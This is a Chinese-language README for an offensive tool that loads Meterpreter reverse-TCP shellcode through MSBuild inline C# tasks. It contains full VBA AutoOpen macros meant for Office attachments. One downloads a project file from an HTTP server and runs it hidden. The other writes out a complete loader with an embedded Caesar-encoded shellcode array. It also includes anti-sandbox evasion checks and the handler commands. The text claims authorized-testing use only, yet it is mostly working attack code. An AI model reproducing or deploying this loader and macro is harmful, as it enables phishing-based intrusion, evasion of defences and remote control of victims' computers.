# MSBuild + VBA Shellcode Loader

利用 MSBuild 内联任务执行 C# 代码，动态修改 IP/端口并注入 Meterpreter TCP 载荷，同时提供免下载 VBA 宏版本。

## ⚠️免责声明

本工具仅供安全研究与授权测试使用。使用者须遵守所在国法律法规，并确保已获得被测系统所有者的明确授权。严禁将此工具用于任何非法攻击、入侵或破坏他人计算机系统的活动。若使用者违反前述规定，产生的一切法律责任与后果由使用者自行承担，与本项目及开发者无关。

## 文件说明

| 文件      | 架构 | 说明                                                        |
| ----------- | ------ | ------------------------------------------------------------- |
| `met64_tcp.csproj`          | x64  | 独立 MSBuild 项目，Caesar+5 加密的 x64 Meterpreter TCP 载荷 |
| `met_tcp.csproj`          | x86  | 独立 MSBuild 项目，Caesar+5 加密的 x86 Meterpreter TCP 载荷 |
| `macro_x86.vba` / 宏模块 | x86  | **VBA 宏（免下载）** ，内嵌 x86 `.csproj`，落地到 `%TEMP%` 后调用 MSBuild 执行                    |

> 所有载荷均采用 **凯撒密码 +5** 静态混淆，运行时解密并动态注入 IP/端口。

## 动态替换IP+端口

传统方法中，每次变更回连地址都需要重新用 `msfvenom` 生成 shellcode，效率低下且易留痕。本工具通过以下方式解决：

- 使用 `msfvenom` 时设置 `LHOST=17.17.17.17  LPORT=8738`，载荷中包含固定模式。
- 运行阶段搜索该模式，将用户提供的 IP 和端口以对应字节序覆盖写入。
- 对于 x86 和 x64，`sockaddr_in` 的结构布局不同，导致 IP 字段在 shellcode 中的偏移量有差异（x86: IP 在 `AF_INET` 前 5 字节；x64: IP 在端口后即 `pos+4`），这是由 msfvenom 生成的不同 stub 决定的。


## 快速使用

### 在当前机器上

先修改csproj内部的ip和端口

![image](assets/image-20260612203151-o49tm70.png)

msf开监听

```bash
# 32位
handler -H 192.168.1.88 -P 4444 -p windows/meterpreter/reverse_tcp

# 64位
handler -H 192.168.1.88 -P 4444 -p windows/x64/meterpreter/reverse_tcp
```

执行

```bash
# 32位
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe met_tcp.csproj

# 64位
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe met64_tcp.csproj
```

### VBA 宏 + MSBuild 执行 x86 Shellcode（需要下载）

ip和port提前在csproj内修改好，将csproj托管到http服务器上，宏代码嵌入office附件，等待目标执行即可。这里只以x86为例。

```bash
Sub AutoOpen()
    Dim WinHttpReq As Object
    Dim oStream As Object
    Dim myURL As String
    Dim LocalFilePath As String
    Dim ExecFile As Double

    myURL = "http://192.168.50.145/met_tcp.csproj"
    LocalFilePath = "C:\Users\Public\Downloads\met_tcp.csproj"
    
    ' Create the HTTP request object
    Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
    WinHttpReq.Open "GET", myURL, False, "", ""
    WinHttpReq.send


        ' Create the stream object to save the file
        Set oStream = CreateObject("ADODB.Stream")
        oStream.Open
        oStream.Type = 1 ' Binary data
        oStream.Write WinHttpReq.responseBody
        oStream.SaveToFile LocalFilePath, 2 ' 2 = overwrite
        oStream.Close
        
        ' Execute the msbuild command to compile the project
		' x64 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe; x86 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe
        ExecFile = Shell("C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe " & LocalFilePath, vbHide)
End Sub
```


### VBA 宏 + MSBuild 执行 x86 Shellcode（免下载）

自行修改IP port即可

```basic
Sub AutoOpen()
    ' ===== 修改这里的 IP 和端口 =====
    Dim targetIP As String
    Dim targetPort As Integer
    targetIP = "192.168.1.100"
    targetPort = 4444
    ' ================================

    ' 架构：64位Office用 Framework64，否则用 Framework
    Dim msbuildPath As String
    #If Win64 Then
        msbuildPath = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe"
    #Else
        msbuildPath = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe"
    #End If

    ' 随机文件名，避免固定特征
    Dim tmpPath As String
    tmpPath = Environ("TEMP") & "\" & RandomString(8) & ".csproj"

    ' 写入csproj
    WriteCsproj tmpPath, targetIP, targetPort

    ' 执行 msbuild（隐藏窗口）
    Shell msbuildPath & " " & Chr(34) & tmpPath & Chr(34), vbHide
End Sub

' 生成随机字符串
Function RandomString(ByVal length As Integer) As String
    Dim chars As String, i As Integer
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    For i = 1 To length
        RandomString = RandomString & Mid(chars, Int(Rnd * Len(chars)) + 1, 1)
    Next i
End Function

' 核心：将csproj写入文件（解决VBA行长度限制）
Sub WriteCsproj(ByVal filePath As String, ByVal ip As String, ByVal port As Integer)
    Dim fso As Object, ts As Object
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set ts = fso.CreateTextFile(filePath, True)

    ' 写入XML头部
    ts.WriteLine "<Project ToolsVersion=""4.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
    ts.WriteLine "  <Target Name=""Run"">"
    ts.WriteLine "    <MetTcp />"
    ts.WriteLine "  </Target>"
    ts.WriteLine "  <UsingTask TaskName=""MetTcp"" TaskFactory=""CodeTaskFactory"" AssemblyFile=""C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll"">"
    ts.WriteLine "    <Task>"
    ts.WriteLine "      <Reference Include=""System"" />"
    ts.WriteLine "      <Code Type=""Class"" Language=""cs"">"
    ts.WriteLine "        <![CDATA["

    ' C#代码部分
    ts.WriteLine "using System;"
    ts.WriteLine "using Microsoft.Build.Framework;"
    ts.WriteLine "using Microsoft.Build.Utilities;"
    ts.WriteLine "using System.Runtime.InteropServices;"
    ts.WriteLine "using System.Net;"
    ts.WriteLine ""
    ts.WriteLine "public class MetTcp : Task, ITask {"
    ts.WriteLine "    [DllImport(""kernel32.dll"")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);"
    ts.WriteLine "    [DllImport(""kernel32.dll"")] static extern IntPtr CreateThread(IntPtr a, uint b, IntPtr c, IntPtr d, uint e, IntPtr f);"
    ts.WriteLine "    [DllImport(""kernel32.dll"")] static extern uint WaitForSingleObject(IntPtr h, uint ms);"
    ts.WriteLine "    [DllImport(""kernel32.dll"")] static extern void Sleep(uint ms);"
    ts.WriteLine "    [DllImport(""kernel32.dll"")] static extern IntPtr VirtualAllocExNuma(IntPtr h, IntPtr a, uint s, uint t, uint p, uint n);"
    ts.WriteLine "    [DllImport(""kernel32.dll"")] static extern IntPtr GetCurrentProcess();"
    ts.WriteLine ""
    ts.WriteLine "    static string targetIP = """ & ip & """;"
    ts.WriteLine "    static int targetPort = " & port & ";"
    ts.WriteLine ""
    ts.WriteLine "    static int FindBytes(byte[] src, byte[] pat) {"
    ts.WriteLine "        for (int i = 0; i <= src.Length - pat.Length; i++) {"
    ts.WriteLine "            bool ok = true;"
    ts.WriteLine "            for (int j = 0; j < pat.Length; j++)"
    ts.WriteLine "                if (src[i + j] != pat[j]) { ok = false; break; }"
    ts.WriteLine "            if (ok) return i;"
    ts.WriteLine "        }"
    ts.WriteLine "        return -1;"
    ts.WriteLine "    }"
    ts.WriteLine ""
    ts.WriteLine "    public static void Main() {"
    ts.WriteLine "        IPAddress ip;"
    ts.WriteLine "        if (!IPAddress.TryParse(targetIP, out ip)) return;"
    ts.WriteLine "        if (targetPort < 1 || targetPort > 65535) return;"
    ts.WriteLine "        int port = targetPort;"
    ts.WriteLine "        var t1 = DateTime.Now;"
    ts.WriteLine "        Sleep(5000);"
    ts.WriteLine "        if ((DateTime.Now - t1).TotalSeconds < 4.5) return;"
    ts.WriteLine "        if (VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0) == IntPtr.Zero) return;"
    ts.WriteLine ""

    ' 分块写入shellcode数组，避免VBA行长度限制
    ts.Write "        byte[] enc = {"
    ts.Write "0x01,0xed,0x94,0x05,0x05,0x05,0x65,0x36,0xd7,0x8e,0xea,0x69,0x90,0x57,0x35,0x90,0x57,0x11,0x90,0x57,0x19,0x90,0x77,0x2d,0x36,0x04,0x14,0xbc,0x4f,0x2b,0x36,0xc5,0xb1,0x41,0x66,0x81,0x07,0x31,0x25,0xc6,0xd4,0x12,0x06,0xcc,0x4e,0x7a,0xf4,0x57,0x90,0x57,0x15,0x5c,0x90,0x47,0x41,0x06,0xd5,0x90,0x45,0x7d,0x8a,0xc5,0x79,0x51,0x06,0xd5,0x90,0x4d,0x1d,0x90,0x5d,0x25,0x55,0x06,0xd8,0x8a,0xce,0x79,0x41,0x36,0x04,0x4e,0x90,0x39,0x90,0x06,0xdb,0x36,0xc5,0xb1,0xc6,0xd4,0x12,0x06,0xcc,0x3d,0xe5,0x7a,0xf9,0x08,0x82,0xfd,0x40,0x82,0x29,0x7a,0xe5,0x5d,0x90,0x5d,0x29,0x06,0xd8,0x6b,0x90,0x11,0x50,0x90,0x5d,0x21,0x06,0xd8,0x90,0x09,0x90,0x06,0xd5,0x8e,0x49,0x29,0x29,0x60,0x60,0x66,0x5e,0x5f,0x56,0x04,0xe5,0x5d,0x64,0x5f,0x90,0x17,0xee,0x85,0x04,0x04,0x04,0x62,0x6d,0x38,0x37,0x05,0x05,0x6d,0x7c,0x78,0x37,0x64,0x59,0x6d,0x51,0x7c,0x2b,0x0c,0x8e,0xed,0x04,0xd5,0xbd,0x95,0x06,0x05,0x05,0x2e,0xc9,0x59,0x55,0x6d,0x2e,0x85,0x70,0x05,0x04,0xda,0x6f,0x0f,0x6d,0x16,0x16,0x16,0x16,0x6d,0x07,0x05,0x27,0x27,"

    ts.Write "0x8e,0xeb,0x55,0x55,0x55,0x55,0x45,0x55,0x45,0x55,0x6d,0xef,0x14,0xe4,0xe5,0x04,0xda,0x9c,0x6f,0x15,0x5b,0x5c,0x6d,0x9e,0xaa,0x79,0x66,0x04,0xda,0x8a,0xc5,0x79,0x0f,0x04,0x53,0x0d,0x7a,0xf1,0xed,0x6c,0x05,0x05,0x05,0x6f,0x05,0x6f,0x09,0x5b,0x5c,0x6d,0x07,0xde,0xcd,0x64,0x04,0xda,0x88,0xfd,0x05,0x83,0x3b,0x90,0x3b,0x6f,0x45,0x6d,0x05,0x15,0x05,0x05,0x5b,0x6f,0x05,0x6d,0x5d,0xa9,0x58,0xea,0x04,0xda,0x98,0x58,0x6f,0x05,0x5b,0x58,0x5c,0x6d,0x07,0xde,0xcd,0x64,0x04,0xda,0x88,0xfd,0x05,0x82,0x2d,0x5d,0x6d,0x05,0x45,0x05,0x05,0x6f,0x05,0x55,0x6d,0x10,0x34,0x14,0x35,0x04,0xda,0x5c,0x6d,0x7a,0x73,0x52,0x66,0x04,0xda,0x63,0x63,0x04,0x11,0x29,0x14,0x8a,0x75,0x04,0x04,0x04,0xee,0xa0,0x04,0x04,0x04,0x06,0xc8,0x2e,0xcb,0x7a,0xc6,0xc8,0xc0,0xf5,0xba,0xa7,0x5b,0x6f,0x05,0x58,0x04,0xda};"

    ts.WriteLine ""
    ts.WriteLine "        byte[] buf = new byte[enc.Length];"
    ts.WriteLine "        for (int i = 0; i < buf.Length; i++) buf[i] = (byte)(((uint)enc[i] - 5) & 0xFF);"
    ts.WriteLine "        byte[] pattern = { 0x02, 0x00, 0x22, 0x22 };"
    ts.WriteLine "        int pos = FindBytes(buf, pattern);"
    ts.WriteLine "        if (pos == -1) return;"
    ts.WriteLine "        int portOffset = pos + 2;"
    ts.WriteLine "        int ipOffset = pos - 5;   // x86"
    ts.WriteLine "        buf[portOffset]   = (byte)((port >> 8) & 0xFF);"
    ts.WriteLine "        buf[portOffset+1] = (byte)(port & 0xFF);"
    ts.WriteLine "        byte[] ipBytes = ip.GetAddressBytes();"
    ts.WriteLine "        Buffer.BlockCopy(ipBytes, 0, buf, ipOffset, 4);"
    ts.WriteLine "        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);"
    ts.WriteLine "        if (addr == IntPtr.Zero) return;"
    ts.WriteLine "        Marshal.Copy(buf, 0, addr, buf.Length);"
    ts.WriteLine "        IntPtr th = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);"
    ts.WriteLine "        if (th == IntPtr.Zero) return;"
    ts.WriteLine "        WaitForSingleObject(th, 0xFFFFFFFF);"
    ts.WriteLine "    }"
    ts.WriteLine ""
    ts.WriteLine "    public override bool Execute() { Main(); return true; }"
    ts.WriteLine "}"

    ' 闭合XML
    ts.WriteLine "        ]]>"
    ts.WriteLine "      </Code>"
    ts.WriteLine "    </Task>"
    ts.WriteLine "  </UsingTask>"
    ts.WriteLine "</Project>"

    ts.Close
End Sub
```


## 反沙箱措施

所有版本均包含两项轻量反沙箱：

- **Sleep 加速检测**：休眠 5 秒后比对实际耗时，若小于 4.5 秒则退出（沙箱通常会快进计时）。
- **NUMA 内存分配**：调用 `VirtualAllocExNuma` 在 NUMA 节点 0 分配内存，失败则退出（多数沙箱不支持 NUMA）。

可在此基础上自行增减环境检测逻辑。
